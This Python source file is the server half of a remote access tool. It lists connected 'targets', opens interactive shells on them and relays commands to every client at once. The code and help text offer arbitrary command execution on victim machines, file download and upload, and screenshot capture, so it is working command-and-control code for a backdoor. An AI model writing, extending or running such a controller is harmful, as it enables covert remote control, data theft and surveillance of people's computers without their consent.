import json
import struct
import base64
import uuid


def send_frame(target, data):
    prefix = struct.pack(">I", len(data))
    target.send(prefix)
    target.send(data)


def receive_frame(target):
    prefix = b""
    prefix_len = 4
    while len(prefix) < prefix_len:
        prefix += target.recv(prefix_len-len(prefix))
    frame = b""
    frame_len = struct.unpack(">I", prefix)[0]
    while len(frame) < frame_len:
        frame += target.recv(min(1024, frame_len-len(frame)))
    return json.loads(frame.decode("utf-8"))


def reliable_send(target, data):
    json_data = json.dumps(data).encode("utf-8")
    send_frame(target, json_data)


help_message = '''
targets: List all connections to the server
session [n]:    Connect to a session. Once connected the you can esecute commands on the client machine.
sendall [command]: Send a command to all the connected clients
exit: Turn off the server and close all connections
help: Show this message

'''

shell_help_message = '''
q: Exit the shell but leave client connection open
close: Close client connection
download [filename]: Get a file from the client's machine
upload [filename]: Upload a file to the client's machine
get [command]: Start a program without blocking the shell
screenshot: Take a screenshot on the client machine
start [command]: Start a program without blocking the shell
get [url]: Download a file from the internet
help-shell: Show this message

Any other commands will be executed by the client's default shell

'''

def start_shell(target_socket, target_ip):
    while True:
        try:
            cmd = input(f"{target_ip}~$ ")
            reliable_send(target_socket, cmd)
            if cmd == "q":
                break
            elif cmd == "close":
                target_socket.close()
                break
            elif cmd[:8] == "download":
                file_data = receive_frame(target_socket)
                if file_data == "DOWNLOAD_FAIL":
                    print("Download Failed")
                else:
                    with open(cmd[9:], "wb") as f:
                        f.write(base64.b64decode(file_data))
            elif cmd[:6] == "upload":
                try:
                    with open(cmd[7:], "rb") as f:
                        file_to_upload = f.read()
                        encoded_file = base64.b64encode(file_to_upload)
                        reliable_send(
                            target_socket, encoded_file.decode("utf-8"))
                except Exception as e:
                    print(e)
                    failed = "UPLOAD_FAIL"
                    reliable_send(target_socket, failed)
            elif cmd[:10] == "screenshot":
                file_data = receive_frame(target_socket)
                if file_data == "SCREENSHOT_FAIL":
                    print("Screenshot Failed")
                else:
                    with open("screenshot_"+uuid.uuid4().hex+".png", "wb") as f:
                        f.write(base64.b64decode(file_data))
        except Exception as e:
            print(str(e))
        message = receive_frame(target_socket)
        if message:
            print(message, flush=True)
